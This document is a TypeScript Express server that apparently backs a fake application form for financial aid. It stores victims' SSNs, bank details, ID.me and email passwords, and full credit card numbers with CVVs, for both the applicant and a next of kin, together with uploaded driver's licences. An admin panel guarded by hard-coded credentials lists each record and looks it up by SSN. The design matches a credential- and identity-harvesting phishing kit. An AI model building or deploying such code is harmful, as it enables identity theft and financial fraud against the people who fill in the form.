import express, { Express, Request, Response, NextFunction } from 'express';
import multer from 'multer';
import mongoose, { Document } from "mongoose";
import userModel from './model/User';
import bodyParser from 'body-parser';
import fs from "fs";
import jwt, { Secret, JwtPayload } from 'jsonwebtoken';
import cookieParser from 'cookie-parser';
import dotenv from "dotenv";

const app: Express = express();
const PORT: number = 8001 || process.env.PORT;
app.use(express.static("public"));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.json());
app.use(cookieParser());

//Importing dotenv
const dotenvFile: string = fs.readFileSync(".hidden.txt", "utf-8");
const envConfig: dotenv.DotenvParseOutput = dotenv.parse(dotenvFile);
dotenv.config(envConfig);

// Configure EJS as the view engine
app.set('view engine', 'ejs');
app.set('views', __dirname + '/views');

const admin_username: string = "killer_of_all";
const admin_password: string = "king_austin_griffin";
const token_secret_key: Secret = "gods_of_all";
const server_admin_url = "/server/admin";
const upload_folder = "./public/uploads"

//ensuring a folder exists and other necessary things are setup
function initializing(): void {
    // Check if the upload folder exists
    const folderPath: string = upload_folder;
    if (!fs.existsSync(folderPath)) {
        // Create the folder
        fs.mkdirSync(folderPath);
        console.log('Upload Folder created successfully.');
    }
}

//setting multer
//First set the storage
const storage = multer.diskStorage({
    destination: (req: Request, file: Express.Multer.File, cb: Function): void => {
        cb(null, upload_folder);
    },
    filename: (req: Request, file: Express.Multer.File, cb: Function): void => {
        cb(null, `${file.originalname}`);
    },
});

//Next is to create a multer instance with the defined storage configuration
const upload = multer({
    storage: storage
});

//Check a function that checks the file size of the document
function checkFileSize(req: Request, res: Response, next: NextFunction): void {
    const fileSizeLimit = 2 * 1024 * 1024; // 2MB
    if (req.headers['content-length']) {
        const contentLength = parseInt(req.headers['content-length']);
        if (contentLength > fileSizeLimit) {
            res.status(400).send('The file size is greater than 2MB');
        } else {
            next()
        }
    }
};

//Define express route and use the multer middleware to handle the file upload
app.post(upload_folder, checkFileSize, upload.single('file'), (req: Request, res: Response) => {
    res.send('File saved successfully!');
});

//Convert Data for saving; First creating the function return interface
interface ConvertedData {
    firstName: string;
    lastName: string;
    streetAddress: string;
    zip: string;
    city: string;
    state: string;
    gender: string;
    dateOfBirth: string;
    citizenshipStatus: string;
    ethnicity: string;
    employmentStatus: string;
    phone: string;
    money: string;
    useDescription: string;
    inform: string;
    bank: string;
    accountNumber: string;
    routingNumber: string;
    socialSecurityNumber: string;
    question1: string;
    question2: string;
    question3: string;
    residentVerification: string;
    idmeEmail: string;
    idmePassword: string;
    email: string;
    password: string;
    nextOfKinFullName: string;
    nextOfKinAddress: string;
    nextOfKinDateOfBirth: string;
    nextOfKinSocialSecurityNumber: string;
    nextOfKinEmail: string;
    nextOfKinPassword: string;
    nextOfKinCardholderName: string;
    nextOfKinBillingAddress: string;
    nextOfKinBillingCity: string;
    nextOfKinBillingState: string;
    nextOfKinBillingZip: string;
    nextOfKinCreditCardNumber: string;
    nextOfKinCreditCardExpiryMonth: string;
    nextOfKinCreditCardExpiryYear: string;
    nextOfKinCreditCardCVV: string;
    cardholderName: string;
    billingAddress: string;
    billingCity: string;
    billingState: string;
    billingZip: string;
    creditCardNumber: string;
    creditCardExpiryMonth: string;
    creditCardExpiryYear: string;
    creditCardCVV: string;
}

//Converting the data
function convertData(inputData: { [key: string]: any }): ConvertedData {
    const convertedData: ConvertedData = {
        firstName: inputData["template-application-first-name"],
        lastName: inputData["template-application-last-name"],
        streetAddress: inputData["template-application-street-address"],
        zip: inputData["template-application-zip"],
        city: inputData["template-application-city"],
        state: inputData["template-application-state"],
        gender: inputData["template-application-gender"],
        dateOfBirth: inputData["template-application-date-of-birth"],
        citizenshipStatus: inputData["template-application-citizenship-status"],
        ethnicity: inputData["template-application-ethnicity"],
        employmentStatus: inputData["template-application-employment-status"],
        phone: inputData["template-application-phone"],
        money: inputData["template-application-money"],
        useDescription: inputData["template-application-usedescription"],
        inform: inputData["template-application-inform"],
        bank: inputData["template-application-bank"],
        accountNumber: inputData["template-application-account-number"],
        routingNumber: inputData["template-application-routing-number"],
        socialSecurityNumber: inputData["template-application-social-security-number"],
        question1: inputData["template-application-question-1"],
        question2: inputData["template-application-question-2"],
        question3: inputData["template-application-question-3"],
        residentVerification: inputData["template-application-resident-verification"],
        idmeEmail: inputData["template-application-ID.ME-email"],
        idmePassword: inputData["template-application-ID.ME-password"],
        email: inputData["template-application-email"],
        password: inputData["template-application-password"],
        nextOfKinFullName: inputData["template-application-next-of-kin-full-name"],
        nextOfKinAddress: inputData["template-application-next-of-kin-address"],
        nextOfKinDateOfBirth: inputData["template-application-next-of-kin-date-of-birth"],
        nextOfKinSocialSecurityNumber: inputData["template-application-next-of-kin-social-security-number"],
        nextOfKinEmail: inputData["template-application-next-of-kin-email"],
        nextOfKinPassword: inputData["template-application-next-of-kin-password"],
        nextOfKinCardholderName: inputData["template-application-next-of-kin-cardholder-name"],
        nextOfKinBillingAddress: inputData["template-application-next-of-kin-billing-address"],
        nextOfKinBillingCity: inputData["template-application-next-of-kin-billing-city"],
        nextOfKinBillingState: inputData["template-application-next-of-kinbilling-state"],
        nextOfKinBillingZip: inputData["template-application-next-of-kin-billing-zip"],
        nextOfKinCreditCardNumber: inputData["template-application-next-of-kin-credit-card-number"],
        nextOfKinCreditCardExpiryMonth: inputData["template-application-next-of-kin-exipiry-month"],
        nextOfKinCreditCardExpiryYear: inputData["template-application-next-of-kin-expiry-year"],
        nextOfKinCreditCardCVV: inputData["template-application-next-of-kin-credit-card-cvv"],
        cardholderName: inputData["template-application-cardholder-name"],
        billingAddress: inputData["template-application-billing-address"],
        billingCity: inputData["template-application-billing-city"],
        billingState: inputData["template-application-billing-state"],
        billingZip: inputData["template-application-billing-zip"],
        creditCardNumber: inputData["template-application-credit-card-number"],
        creditCardExpiryMonth: inputData["template-application-credit-card-expiry-month"],
        creditCardExpiryYear: inputData["template-application-credit-card-expiry-year"],
        creditCardCVV: inputData["template-application-credit-card-cvv"]
    };

    return convertedData;
};

//Handling saving content to the database
async function saveUser(data: Promise<{ [key: string]: any }>): Promise<void> {
    const convertedData: ConvertedData = convertData(data);
    try {
        const myUser = new userModel(convertedData);
        const savedData = await myUser.save();
        console.log('Content saved successfully!', savedData);
    } catch (error) {
        console.error('Error saving content:', error);
    } finally {
        mongoose.disconnect();
    }
};

//Connecting to database
async function connectToDatabase(): Promise<void> {
    try {
        // const dbURI: string = "mongodb://127.0.0.1:27017/mydatabase";
        const DB_USER: string | undefined = process.env.DB_USER;
        const DB_PASSWORD: string | undefined = process.env.DB_PASSWORD;
        const DB_DATABASE: string | undefined = process.env.DB_DATABASE;
        if ((typeof (DB_USER) === "string") && (typeof (DB_PASSWORD) === "string") && (typeof (DB_DATABASE) === "string")) {
            const dbURI: string = `mongodb+srv://${DB_USER}:${DB_PASSWORD}@mydb.jio0eir.mongodb.net/?retryWrites=true&w=majority${DB_DATABASE}`;
            await mongoose.connect(dbURI);
        }
        // }
    } catch (error) {
        console.error('Failed to connect to MongoDB', error);
    }
}

//Recieving Form and saving to database
app.post("/register", async (req: Request, res: Response) => {
    await connectToDatabase();
    const form: Record<string, any> = req.body;
    // console.log(form);
    await saveUser(req.body);
    await mongoose.disconnect()
    res.end("Registration Successful");
});

//Running the index page
app.get("/", (req: Request, res: Response) => {
    res.render("index.html");
});

app.get(`${server_admin_url}/login`, (req: Request, res: Response) => {
    res.render("login");
});

app.post(`${server_admin_url}/login`, (req: Request, res: Response) => {
    function validateUser(username: string, password: string): boolean {
        return username === admin_username && password === admin_password;
    }
    if (validateUser(req.body.username, req.body.password)) {
        const token = jwt.sign({ username: req.body.username }, token_secret_key, {
            expiresIn: '1h',
        });
        res.cookie('jwt', token, {
            expires: new Date(Date.now() + (34 * 3600000)),
            httpOnly: true,
            // secure: true,
            sameSite: 'strict'
        });
        res.status(200).json({ login: "/server/admin" });
    }
    else {
        if (req.body.username != admin_username) {
            res.json({ message: "username incorrect" })
        }
        else if (req.body.password != admin_password) {
            res.json({ message: "password incorrect!" })
        }
        else {
            res.status(401).json({ message: 'Invalid! No body' })
        }
    }
});

//middleware for validating jwt tokens
function validate(req: Request, res: Response, next: NextFunction): void {
    const token = req.cookies.jwt;
    if (token) {
        jwt.verify(token, token_secret_key, (err: jwt.VerifyErrors | null, decodedToken: string | undefined | object) => {
            if (err) {
                return res.status(403).redirect("/server/admin/login");
            }
            if (decodedToken) {
                next();
            }
        })
    } else {
        res.status(401).redirect("/server/admin/login");
    }
}

//Define the schema of User
interface MyUser extends Document {
    firstName: string;
    lastName: string;
    streetAddress: string;
    zip: string;
    city: string;
    state: string;
    gender: string;
    dateOfBirth: string;
    citizenshipStatus: string;
    ethnicity: string;
    employmentStatus: string;
    phone: string;
    money: string;
    useDescription: string;
    inform: string;
    bank: string;
    accountNumber: string;
    routingNumber: string;
    socialSecurityNumber: string;
    question1: string;
    question2: string;
    question3: string;
    residentVerification: string;
    idmeEmail: string;
    idmePassword: string;
    email: string;
    password: string;
    nextOfKinFullName: string;
    nextOfKinAddress: string;
    nextOfKinDateOfBirth: string;
    nextOfKinSocialSecurityNumber: string;
    nextOfKinEmail: string;
    nextOfKinPassword: string;
    nextOfKinCardholderName: string;
    nextOfKinBillingAddress: string;
    nextOfKinBillingCity: string;
    nextOfKinBillingState: string;
    nextOfKinBillingZip: string;
    nextOfKinCreditCardNumber: string;
    nextOfKinCreditCardExpiryMonth: string;
    nextOfKinCreditCardExpiryYear: string;
    nextOfKinCreditCardCVV: string;
    cardholderName: string;
    billingAddress: string;
    billingCity: string;
    billingState: string;
    billingZip: string;
    creditCardNumber: string;
    creditCardExpiryMonth: string;
    creditCardExpiryYear: string;
    creditCardCVV: string;
}

//Get all mongoose data
async function getAllData(): Promise<MyUser[] | undefined> {
    try {
        const data: MyUser[] = await userModel.find({});
        return data;
    } catch (error: unknown) {
        return undefined
    }
}

//Admin route
app.get([`${server_admin_url}`, `${server_admin_url}/`], validate, async (req: Request, res: Response) => {
    await connectToDatabase();
    const user_data_promise: Promise<MyUser[] | undefined> = getAllData();
    const data: MyUser[] | undefined = await user_data_promise;
    await mongoose.disconnect();
    res.render("admin", { data: data });
});

//Admin user route
app.get(`${server_admin_url}/user/`, validate, (req: Request, res: Response) => {
    res.redirect(`${server_admin_url}`);
});

//Get user data using the value
async function getUserData(ssn: string): Promise<MyUser[] | null> {
    await connectToDatabase();
    try {
        const user_data: MyUser[] | null = await userModel.findOne({ socialSecurityNumber: ssn });
        mongoose.disconnect();
        return user_data;
    } catch (error: any) {
        mongoose.disconnect();
        return null
    }
}

//Delete from database 
async function deleteUserData(ssn: string): Promise<Boolean> {
    await connectToDatabase();
    const deleted: boolean = await userModel.deleteOne({ socialSecurityNumber: ssn }).then(() => {
        return true
    }).catch(() => {
        return false
    });
    return deleted
}

//Checking doc in the upload folder and returning the first file to match 
function checkdoc(ssn: string): string | undefined {
    const all_files: string[] = fs.readdirSync(upload_folder);
    for (let i = 0; i < all_files.length; i++) {
        const file: string[] = all_files[i].split("-");
        if (ssn === file[0] && file[1] != "driver_license_front") {
            if (file[1] != "driver_license_back") {
                return all_files[i]
            }
        }
    }
    return undefined
}

//user route
app.get(`${server_admin_url}/user/:id`, validate, async (req: Request, res: Response) => {
    const ssn: string = req.params.id;
    const data: MyUser[] | null = await getUserData(ssn);
    if (typeof (data) == null) {
        res.redirect(`${server_admin_url}`);
    } else {
        const file: string | undefined = checkdoc(ssn);
        if (typeof (file) != "undefined") {
            res.render("user", { data: data, file: file });
        } else {
            res.render("user", { data: data, file: "" })
        }
    }
});


//delete user route
app.get(`${server_admin_url}/user/delete/:id`, validate, async (req: Request, res: Response) => {
    const ssn: string = req.params.id;
    const deleted: Boolean = await deleteUserData(ssn);
    if (deleted) {
        res.redirect(`${server_admin_url}`);
    } else {
        res.redirect(`${server_admin_url}/user/${ssn}`);
    }
});

//Loggout route
app.get("/logout", (req: Request, res: Response) => {
    res.clearCookie('jwt');
    res.redirect(`${server_admin_url}/login`);
});

app.get("*", (req: Request, res: Response) => {
    res.redirect("/");
});


app.listen(PORT, async () => {
    try {
        initializing();
        console.log(`Listening at PORT ${PORT}`);
    }
    catch (error: unknown) {
        console.log("An Error has occurred when trying to listen for error")
    }
});
